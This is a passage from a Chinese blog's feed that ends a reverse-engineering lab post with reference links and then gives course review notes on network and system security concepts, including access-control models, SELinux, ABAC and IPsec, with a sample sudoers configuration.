main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310213131937.png&#34; alt=&#34;image-20230310213131937&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;p&gt;(一开始做了好久,硬逆向,发现确实不太好弄…本来想放弃了…搜了搜有原题..就参考了(抄)了一下)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.52pojie.cn/thread-1717425-1-1.html&#34;&gt;https://www.52pojie.cn/thread-1717425-1-1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.angr.io/&#34;&gt;https://docs.angr.io&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2023-03-10T11:18:16.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/</id>
        <title>ucas-网络与系统安全-复习</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;多选单选论述&lt;/p&gt;
&lt;p&gt;其中有大部分是其他同学完成的,自己做了一定的整合和修改.&lt;/p&gt;
&lt;h1 id=&#34;第一次课：新形势安全面临挑战和安全保障能力提升&#34;&gt;&lt;a href=&#34;#第一次课：新形势安全面临挑战和安全保障能力提升&#34; class=&#34;headerlink&#34; title=&#34;第一次课：新形势安全面临挑战和安全保障能力提升&#34;&gt;&lt;/a&gt;第一次课：新形势安全面临挑战和安全保障能力提升&lt;/h1&gt;&lt;h2 id=&#34;1-1-信息技术的发展趋势&#34;&gt;&lt;a href=&#34;#1-1-信息技术的发展趋势&#34; class=&#34;headerlink&#34; title=&#34;1.1 信息技术的发展趋势&#34;&gt;&lt;/a&gt;1.1 信息技术的发展趋势&lt;/h2&gt;&lt;p&gt;对象的特点: 融合、扩张、协作；&lt;/p&gt;
&lt;h2 id=&#34;1-2-信息安全面临的挑战&#34;&gt;&lt;a href=&#34;#1-2-信息安全面临的挑战&#34; class=&#34;headerlink&#34; title=&#34;1.2 信息安全面临的挑战&#34;&gt;&lt;/a&gt;1.2 信息安全面临的挑战&lt;/h2&gt;&lt;p&gt;隐私、身份、电子依赖、信任绑架、信息财富、边界模糊&lt;/p&gt;
&lt;h2 id=&#34;1-3-信息安全的技术发展趋势&#34;&gt;&lt;a href=&#34;#1-3-信息安全的技术发展趋势&#34; class=&#34;headerlink&#34; title=&#34;1.3 信息安全的技术发展趋势&#34;&gt;&lt;/a&gt;1.3 信息安全的技术发展趋势&lt;/h2&gt;&lt;p&gt;保护、检测、可生存、可信赖；&lt;/p&gt;
&lt;p&gt;检测又叫全周期…&lt;/p&gt;
&lt;h1 id=&#34;第二次课：网络与系统安全的需求与目标&#34;&gt;&lt;a href=&#34;#第二次课：网络与系统安全的需求与目标&#34; class=&#34;headerlink&#34; title=&#34;第二次课：网络与系统安全的需求与目标&#34;&gt;&lt;/a&gt;第二次课：网络与系统安全的需求与目标&lt;/h1&gt;&lt;p&gt;​		即我们要做到什么程度,上一节课是要做什么&lt;/p&gt;
&lt;h2 id=&#34;2-1-信息安全的基本需求：CIAA&#34;&gt;&lt;a href=&#34;#2-1-信息安全的基本需求：CIAA&#34; class=&#34;headerlink&#34; title=&#34;2.1 信息安全的基本需求：CIAA&#34;&gt;&lt;/a&gt;2.1 信息安全的基本需求：CIAA&lt;/h2&gt;&lt;p&gt;机密性Confidentiality；完整性Integrity；可用性Availability；真实性Authenticity；&lt;/p&gt;
&lt;h2 id=&#34;2-2-信息安全的目标&#34;&gt;&lt;a href=&#34;#2-2-信息安全的目标&#34; class=&#34;headerlink&#34; title=&#34;2.2 信息安全的目标&#34;&gt;&lt;/a&gt;2.2 信息安全的目标&lt;/h2&gt;&lt;p&gt;这句是重点:&lt;strong&gt;防止威胁利用弱点破坏信息安全特性&lt;/strong&gt;, 以及 控制风险&lt;/p&gt;
&lt;p&gt;控制风险，确定威胁利用弱点实施 破坏发生的概率（识别风险），决定采取何种措施，将风险降低到可以接受的水平。从绝对安全到适度安全；防止威胁利用弱点破坏信息安全特性&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106143853743.png&#34; alt=&#34;image-20230106143853743&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;信息安全风险的概念？从绝对安全到适度安全；&#34;&gt;&lt;a href=&#34;#信息安全风险的概念？从绝对安全到适度安全；&#34; class=&#34;headerlink&#34; title=&#34;信息安全风险的概念？从绝对安全到适度安全；&#34;&gt;&lt;/a&gt;信息安全风险的概念？从绝对安全到适度安全；&lt;/h2&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144007466.png&#34; alt=&#34;image-20230106144007466&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;p&gt;完成一个组织如何评估、应对、监视信息系统安全风险的策略性规定，包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;详细的安全假定确定；&lt;/li&gt;
&lt;li&gt;安全风险控制实施所受的各种可能的限制；&lt;/li&gt;
&lt;li&gt;机构对风险的容忍程度；&lt;/li&gt;
&lt;li&gt;风险处理过程中的面临的各种这种决策的优先次序；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;威胁利用弱点给信息资产造成负面影响的潜在可能&lt;/p&gt;
&lt;h2 id=&#34;2-3-保护阶段的目标：TCSEC橘皮书和CC标准；&#34;&gt;&lt;a href=&#34;#2-3-保护阶段的目标：TCSEC橘皮书和CC标准；&#34; class=&#34;headerlink&#34; title=&#34;2.3 保护阶段的目标：TCSEC橘皮书和CC标准；&#34;&gt;&lt;/a&gt;2.3 保护阶段的目标：TCSEC橘皮书和CC标准；&lt;/h2&gt;&lt;h2 id=&#34;2-4-生命周期阶段的保护目标：&#34;&gt;&lt;a href=&#34;#2-4-生命周期阶段的保护目标：&#34; class=&#34;headerlink&#34; title=&#34;2.4 生命周期阶段的保护目标：&#34;&gt;&lt;/a&gt;2.4 生命周期阶段的保护目标：&lt;/h2&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144344921.png&#34; alt=&#34;image-20230106144344921&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;h3 id=&#34;入侵检测技术&#34;&gt;&lt;a href=&#34;#入侵检测技术&#34; class=&#34;headerlink&#34; title=&#34;入侵检测技术&#34;&gt;&lt;/a&gt;入侵检测技术&lt;/h3&gt;&lt;p&gt;IDS是PDR模型的中的重要支撑技术，IDS主要的功能为：监视、评估信息网络系统中的恶意或者违反安全策略的行为，并产生相应的报警。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144415448.png&#34; alt=&#34;image-20230106144415448&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;h3 id=&#34;PDCA-的概念：&#34;&gt;&lt;a href=&#34;#PDCA-的概念：&#34; class=&#34;headerlink&#34; title=&#34;PDCA 的概念：&#34;&gt;&lt;/a&gt;PDCA 的概念：&lt;/h3&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144220608.png&#34; alt=&#34;image-20230106144220608&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;ul&gt;
&lt;li&gt;Plan： 对ISMS范围所及进行风险评估和控制方案设计；&lt;/li&gt;
&lt;li&gt;Do：对于不可接受风险，实施风险处理计划，比如增加防火墙等安全措施；&lt;/li&gt;
&lt;li&gt;Check：分析运行效果，寻求改进机会；&lt;/li&gt;
&lt;li&gt;Act： 经过了评审之后，要执行的进一步动作；&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-5-可生存技术：拜占庭容错和门限密码技术&#34;&gt;&lt;a href=&#34;#2-5-可生存技术：拜占庭容错和门限密码技术&#34; class=&#34;headerlink&#34; title=&#34;2.5 可生存技术：拜占庭容错和门限密码技术&#34;&gt;&lt;/a&gt;2.5 可生存技术：拜占庭容错和门限密码技术&lt;/h2&gt;&lt;p&gt;技术思路: 消除单点失效&lt;/p&gt;
&lt;h4 id=&#34;可生存技术的基本原理：&#34;&gt;&lt;a href=&#34;#可生存技术的基本原理：&#34; class=&#34;headerlink&#34; title=&#34;可生存技术的基本原理：&#34;&gt;&lt;/a&gt;可生存技术的基本原理：&lt;/h4&gt;&lt;p&gt;信息系统通过特定的设计，变得不是那么脆弱，一碰就倒，一触即溃。信息系统生存技术关注：计算过程的可靠性和错误容忍。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144707638.png&#34; alt=&#34;image-20230106144707638&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106144650598.png&#34; alt=&#34;image-20230106144650598&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;2-6-自重构可信赖保护技术：&#34;&gt;&lt;a href=&#34;#2-6-自重构可信赖保护技术：&#34; class=&#34;headerlink&#34; title=&#34;2.6 自重构可信赖保护技术：&#34;&gt;&lt;/a&gt;2.6 自重构可信赖保护技术：&lt;/h2&gt;&lt;p&gt;动态构建、适度安全、随着任务启动生成保护，随任务结束推出（保护的生与死）&lt;/p&gt;
&lt;h1 id=&#34;第三次课：自主与强制访问控制&#34;&gt;&lt;a href=&#34;#第三次课：自主与强制访问控制&#34; class=&#34;headerlink&#34; title=&#34;第三次课：自主与强制访问控制&#34;&gt;&lt;/a&gt;第三次课：自主与强制访问控制&lt;/h1&gt;&lt;p&gt;自己的理解: 设定权限范围,划清界限&lt;/p&gt;
&lt;p&gt;保护的核心技术&lt;/p&gt;
&lt;h2 id=&#34;3-1-访问控制的基本概念&#34;&gt;&lt;a href=&#34;#3-1-访问控制的基本概念&#34; class=&#34;headerlink&#34; title=&#34;3.1 访问控制的基本概念&#34;&gt;&lt;/a&gt;3.1 访问控制的基本概念&lt;/h2&gt;&lt;p&gt;框架模型,不是策略模型&lt;/p&gt;
&lt;p&gt;应用程序访问计算机资源，根据授权策略（ 规则集）决定访问请求是否被允许。&lt;/p&gt;
&lt;h2 id=&#34;3-2-访问控制的要素？&#34;&gt;&lt;a href=&#34;#3-2-访问控制的要素？&#34; class=&#34;headerlink&#34; title=&#34;3.2 访问控制的要素？&#34;&gt;&lt;/a&gt;3.2 访问控制的要素？&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;主体S（Subject）：资源访问的具体请求者，又称发起者（Initiator），可能是某一用户，信息系统中更多是用户启动的进程、服务和设备等。&lt;/li&gt;
&lt;li&gt;客体O（Object）：是指被访问资源的实体，又称目标（Target），所有可以被操作的信息、资源、对象都可以是客体。&lt;/li&gt;
&lt;li&gt;控制策略A（Attribution）：访问策略体现了主体对客体的授权行为，也是客体对主体某些操作行为的认可。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-3-访问控制3种基本类型？&#34;&gt;&lt;a href=&#34;#3-3-访问控制3种基本类型？&#34; class=&#34;headerlink&#34; title=&#34;3.3 访问控制3种基本类型？&#34;&gt;&lt;/a&gt;3.3 访问控制3种基本类型？&lt;/h2&gt;&lt;p&gt;模型含义是重点,&lt;/p&gt;
&lt;p&gt;什么mac dac搞清楚&lt;/p&gt;
&lt;p&gt;模型不是来限制你的,而是有它适用范围,给你一个依据来具体设置访问控制模型&lt;/p&gt;
&lt;h3 id=&#34;自主访问控制DAC-典型案例-UGO-Discretionary-Access-Control&#34;&gt;&lt;a href=&#34;#自主访问控制DAC-典型案例-UGO-Discretionary-Access-Control&#34; class=&#34;headerlink&#34; title=&#34;自主访问控制DAC(典型案例:UGO) (Discretionary Access Control)&#34;&gt;&lt;/a&gt;自主访问控制DAC(典型案例:UGO) (Discretionary Access Control)&lt;/h3&gt;&lt;h3 id=&#34;强制访问控制MAC（Mandatory-Access-Control&#34;&gt;&lt;a href=&#34;#强制访问控制MAC（Mandatory-Access-Control&#34; class=&#34;headerlink&#34; title=&#34;强制访问控制MAC（Mandatory Access Control)&#34;&gt;&lt;/a&gt;强制访问控制MAC（Mandatory Access Control)&lt;/h3&gt;&lt;h3 id=&#34;基于角色的访问控制RBAC&#34;&gt;&lt;a href=&#34;#基于角色的访问控制RBAC&#34; class=&#34;headerlink&#34; title=&#34;基于角色的访问控制RBAC&#34;&gt;&lt;/a&gt;基于角色的访问控制RBAC&lt;/h3&gt;&lt;p&gt;它和基于组的访问控制不一样&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106145828352.png&#34; alt=&#34;image-20230106145828352&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;3-4-访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？&#34;&gt;&lt;a href=&#34;#3-4-访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？&#34; class=&#34;headerlink&#34; title=&#34;3.4 访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？&#34;&gt;&lt;/a&gt;3.4 访问控制矩阵、访问控制列表、访问控制能力和安全标签的概念？&lt;/h2&gt;&lt;p&gt;矩阵,列表 都属于dac,都是自主访问控制,和用户密切相关&lt;/p&gt;
&lt;p&gt;ibac列表和能力cbac很重要&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;访问控制矩阵中一行代表一个主体，一列代表一个客体，一个元素表示一个主体被授权的对客体的操作；访问控制矩阵可以直观地表示主体与客体的关系，对于推导和描述访问控制策略具有意义。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;访问控制列表(ibac,identify based access control基于身份的)是目标对象的属性表，它给定每个用户对给定目标的访问权限，本质上是访问控制矩阵的一个列。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106145325384.png&#34; alt=&#34;image-20230106145325384&#34; style=&#34;zoom: 33%;&#34;&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;访问控制能力(cbac 基于能力的)是发起者拥有的一个有效标签（Ticket），它授权持有者以特定的方式访问特定的目标。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106145352028.png&#34; alt=&#34;image-20230106145352028&#34; style=&#34;zoom:33%;&#34;&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安全标签通常的用途是支持多级访问控制策略在访问控制中， 一个安全标签隶属于一个用户、一个目标、一个访问请求或传输中的一个访问控制信息。标签的产生和附着个过程必须可信，在处理一个访问请求时，目标环境比较请求上的标签和目标上的标签决定是允许还是拒绝访问。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-5-自主访问控制和强制访问控制；&#34;&gt;&lt;a href=&#34;#3-5-自主访问控制和强制访问控制；&#34; class=&#34;headerlink&#34; title=&#34;3.5 自主访问控制和强制访问控制；&#34;&gt;&lt;/a&gt;3.5 自主访问控制和强制访问控制；&lt;/h2&gt;&lt;p&gt;理解核心.角色是什么什么的&lt;/p&gt;
&lt;h4 id=&#34;自主访问控制：&#34;&gt;&lt;a href=&#34;#自主访问控制：&#34; class=&#34;headerlink&#34; title=&#34;自主访问控制：&#34;&gt;&lt;/a&gt;自主访问控制：&lt;/h4&gt;&lt;p&gt;DAC允许合法用户以用户或用户组的身份访问策略规定的客体，同时阻止非授权用户访问客体。&lt;/p&gt;
&lt;h4 id=&#34;强制访问控制：&#34;&gt;&lt;a href=&#34;#强制访问控制：&#34; class=&#34;headerlink&#34; title=&#34;强制访问控制：&#34;&gt;&lt;/a&gt;强制访问控制：&lt;/h4&gt;&lt;p&gt;MAC实现比DAC更为严格的访问控制策略， MAC是一种多级访问控制策略，用户和客体具有不同的安全级别，用户不能改变自身和客体的安全级别，只有管理员才能够确定用户和组的访问权限，系统对访问主体和受控对象， 按照安全级对应规则实行强制访问控制。&lt;/p&gt;
&lt;h2 id=&#34;3-6-BLP、BIBA模型-多级安全强制访问控制策略&#34;&gt;&lt;a href=&#34;#3-6-BLP、BIBA模型-多级安全强制访问控制策略&#34; class=&#34;headerlink&#34; title=&#34;3.6 BLP、BIBA模型(多级安全强制访问控制策略)&#34;&gt;&lt;/a&gt;3.6 BLP、BIBA模型(多级安全强制访问控制策略)&lt;/h2&gt;&lt;h3 id=&#34;Bell－Lapadula（BLP）模型-关注机密性&#34;&gt;&lt;a href=&#34;#Bell－Lapadula（BLP）模型-关注机密性&#34; class=&#34;headerlink&#34; title=&#34;Bell－Lapadula（BLP）模型  关注机密性&#34;&gt;&lt;/a&gt;Bell－Lapadula（BLP）模型  关注机密性&lt;/h3&gt;&lt;p&gt;客体被分成安全级别依次降低的:绝密、机密、秘密和公开等级别&lt;/p&gt;
&lt;p&gt;主体也被制定不同的安全级别&lt;/p&gt;
&lt;p&gt;BLP模型确保: &lt;font color=&#34;red&#34;&gt;机密信息不会从高安全级别流向低安全级别&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;BLP模型由政府资助的Mitre 公司正式提出，BLP模型关注多级安全中的机密性保护，客体被分成安全级别依次降低的：绝密、机密、秘密和公开等级别，主体也被制定不同的安全级别，BLP模型确保机密信息不会从高安全级别流向低安全级别。BLP模型中一个系统的状态可以用三元组{b,M,f}标示； 如果主体访问客体的操作与系统确定的安全规则一致，则系统的状态是安全的。 BLP模型定义了系统的安全规则。&lt;/p&gt;
&lt;h3 id=&#34;BIBA模型-关注完整性&#34;&gt;&lt;a href=&#34;#BIBA模型-关注完整性&#34; class=&#34;headerlink&#34; title=&#34;BIBA模型 关注完整性&#34;&gt;&lt;/a&gt;BIBA模型 关注完整性&lt;/h3&gt;&lt;p&gt;BLP安全模型仅关注信息的机密性，Biba安全模型关注多级安全系统中的信息完整性保护。Biba模型由一组强制访问控制策略和一组自主访问控制策略组成。在操作系统里，为确保内核完整性，从Biba模型的角度，内核可以调用应用程序，反之将是违反Biba模型安全规则的操作。&lt;/p&gt;
&lt;h2 id=&#34;3-7-Linux的UGO访问控制原理&#34;&gt;&lt;a href=&#34;#3-7-Linux的UGO访问控制原理&#34; class=&#34;headerlink&#34; title=&#34;3.7 Linux的UGO访问控制原理&#34;&gt;&lt;/a&gt;3.7 Linux的UGO访问控制原理&lt;/h2&gt;&lt;p&gt; 本质上属于 基于访问控制列表的机制&lt;/p&gt;
&lt;p&gt;在每个文件上附加一段有关访问控制信息的二进制位，这些二进制位反映了不同类别用户对该文件的存取方式，即文件的拥有者（User， Owner）、文件拥有者同组的用户（Group）和其他用户（Other），所以我们称这个方式为UGO自主访问控制。UGO属于基于访问控制列表的机制，基于访问控制列表的机制需要依赖于对用户的鉴别。&lt;/p&gt;
&lt;h3 id=&#34;sudo&#34;&gt;&lt;a href=&#34;#sudo&#34; class=&#34;headerlink&#34; title=&#34;sudo&#34;&gt;&lt;/a&gt;sudo&lt;/h3&gt;&lt;p&gt;sudo岂不是万能的?和root一样吗?&lt;/p&gt;
&lt;p&gt;不是的,可以限制使用的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#includedir /etc/sudoers.d&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lighthouse ALL=(ALL) NOPASSWD: ALL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ubuntu  ALL=(ALL:ALL) NOPASSWD: ALL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h1 id=&#34;第四次课：基于属性的访问控制ABAC&#34;&gt;&lt;a href=&#34;#第四次课：基于属性的访问控制ABAC&#34; class=&#34;headerlink&#34; title=&#34;第四次课：基于属性的访问控制ABAC&#34;&gt;&lt;/a&gt;第四次课：基于属性的访问控制ABAC&lt;/h1&gt;&lt;h2 id=&#34;4-1-SELinux：基于类型的访问控制，安全上下文；&#34;&gt;&lt;a href=&#34;#4-1-SELinux：基于类型的访问控制，安全上下文；&#34; class=&#34;headerlink&#34; title=&#34;4.1 SELinux：基于类型的访问控制，安全上下文；&#34;&gt;&lt;/a&gt;4.1 SELinux：基于类型的访问控制，安全上下文；&lt;/h2&gt;&lt;h3 id=&#34;SELinux基本概念&#34;&gt;&lt;a href=&#34;#SELinux基本概念&#34; class=&#34;headerlink&#34; title=&#34;SELinux基本概念&#34;&gt;&lt;/a&gt;SELinux基本概念&lt;/h3&gt;&lt;p&gt;通过类型强制（TE）访问控制提供了更为灵活、实用MAC机制。在SELInux中，所有访问必须明确授权，通过使用allow规则授予访问权限。Allow规则有四部分组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;ul&gt;
&lt;li&gt;源类型：尝试进行访问控制的域类型。&lt;/li&gt;
&lt;li&gt;目标类型：被进程访问的客体类型。&lt;/li&gt;
&lt;li&gt;客体类别：允许访问的客体的种类名称。&lt;/li&gt;
&lt;li&gt;许可：目标类型允许源类型访问的种类。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安全上下文&#34;&gt;&lt;a href=&#34;#安全上下文&#34; class=&#34;headerlink&#34; title=&#34;安全上下文&#34;&gt;&lt;/a&gt;安全上下文&lt;/h3&gt;&lt;p&gt;所有操作系统访问控制都是以关联的客体和主体的访问控制属性为基础；访问控制属性叫做安全上下文。一个安全上下文的组成格式如下：{用户；角色；类型}。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106154247145.png&#34; alt=&#34;image-20230106154247145&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;4-2-基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。&#34;&gt;&lt;a href=&#34;#4-2-基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。&#34; class=&#34;headerlink&#34; title=&#34;4.2 基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。&#34;&gt;&lt;/a&gt;4.2 基于属性的访问控制（ABAC）：基本概念，主要元素，基本架构，传统访问控制模型与ABAC的联系；基于属性的策略。&lt;/h2&gt;&lt;h5 id=&#34;ABAC基本概念&#34;&gt;&lt;a href=&#34;#ABAC基本概念&#34; class=&#34;headerlink&#34; title=&#34;ABAC基本概念&#34;&gt;&lt;/a&gt;&lt;strong&gt;ABAC基本概念&lt;/strong&gt;&lt;/h5&gt;&lt;p&gt;ABAC定义了主题的属性和客体的属性以及访问发生时候的条件，ABAC将这些属性信息和条件信息与规则的信息对比进行访问控制决策。ABAC的控制规则由属性和条件信息组成。ABAC中每一个客体都必须至少有一个策略规则决定什么样的主体能够对其进行什么样的操作。&lt;/p&gt;
&lt;h5 id=&#34;元素&#34;&gt;&lt;a href=&#34;#元素&#34; class=&#34;headerlink&#34; title=&#34;元素&#34;&gt;&lt;/a&gt;元素&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;ul&gt;
&lt;li&gt;属性：刻画主体、客体和条件特性的“键值对”。&lt;/li&gt;
&lt;li&gt;主体：意图执行访问操作的自然人或非人设备。&lt;/li&gt;
&lt;li&gt;客体：ABAC保护下的系统资源例如： 设备、文件、进程、网络服务等。&lt;/li&gt;
&lt;li&gt;操作：主体对客体的操作，包括： 读、写、编辑、删除、拷贝、执行等。&lt;/li&gt;
&lt;li&gt;政策：一组规则或者关系，用于确定一个访问请求是否被允许或者拒绝。&lt;/li&gt;
&lt;li&gt;环境上下文：可以检测到的环境上下文特征，如：访问发生时的时间、地点和威胁水平等。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;架构-x2F-过程&#34;&gt;&lt;a href=&#34;#架构-x2F-过程&#34; class=&#34;headerlink&#34; title=&#34;架构&amp;#x2F;过程&#34;&gt;&lt;/a&gt;架构&amp;#x2F;过程&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;ul&gt;
&lt;li&gt;Access Control Mechanism（ACM）收到主体的访问控制请求；&lt;/li&gt;
&lt;li&gt;根据Policy检查主体属性、客体属性以及环境条件；&lt;/li&gt;
&lt;li&gt;决定主体对客体的操作是否允许。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;传统访问控制与ABAC联系&#34;&gt;&lt;a href=&#34;#传统访问控制与ABAC联系&#34; class=&#34;headerlink&#34; title=&#34;传统访问控制与ABAC联系&#34;&gt;&lt;/a&gt;传统访问控制与ABAC联系&lt;/h5&gt;&lt;p&gt;基于身份的访问控制和RBAC可以看作是 ABAC的一个特例，角色也可以看作是一个属性，从而将角色的访问控制策略转换成属性规则。&lt;/p&gt;
&lt;h5 id=&#34;基于属性的策略&#34;&gt;&lt;a href=&#34;#基于属性的策略&#34; class=&#34;headerlink&#34; title=&#34;基于属性的策略&#34;&gt;&lt;/a&gt;基于属性的策略&lt;/h5&gt;&lt;p&gt;ABAC属性管理主要完成属性的命名、定义、取值范围确定以及与主体和客体绑定等。主体属性一般由属性管理机构提供，如果不同机构的主体存在访问需求，需要在不同机构之间建立属性映射机制。&lt;/p&gt;
&lt;h1 id=&#34;第五次课：网络边界与防护&#34;&gt;&lt;a href=&#34;#第五次课：网络边界与防护&#34; class=&#34;headerlink&#34; title=&#34;第五次课：网络边界与防护&#34;&gt;&lt;/a&gt;第五次课：网络边界与防护&lt;/h1&gt;&lt;p&gt;ipsec可以支持ip层所有流量的加密和&amp;#x2F;或鉴别,因此可以增强所有分布式应用的安全性&lt;/p&gt;
&lt;h2 id=&#34;5-1-IPSEC协议的两个基本协议：&#34;&gt;&lt;a href=&#34;#5-1-IPSEC协议的两个基本协议：&#34; class=&#34;headerlink&#34; title=&#34;5.1 IPSEC协议的两个基本协议：&#34;&gt;&lt;/a&gt;5.1 IPSEC协议的两个基本协议：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;鉴别头协议 AH ：&lt;/strong&gt;AH协议提供数据源认证、数据完整性校验和报文防重放功能， 但不提供机密性。&lt;/p&gt;
&lt;p&gt;数据源身份验证：计算验证码时加入一个共享密钥（HMAC） &lt;/p&gt;
&lt;p&gt;完整性验证：通过杂凑函数产生的校验值 &lt;/p&gt;
&lt;p&gt;AH报头中的序列号防止重放攻击&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106130903382.png&#34; alt=&#34;image-20230106130903382&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;有效载荷封装协议ESP：&lt;/strong&gt;提供了除了AH认证头协议的所有功能外，还可以对IP报文净荷进行加密。&lt;/p&gt;
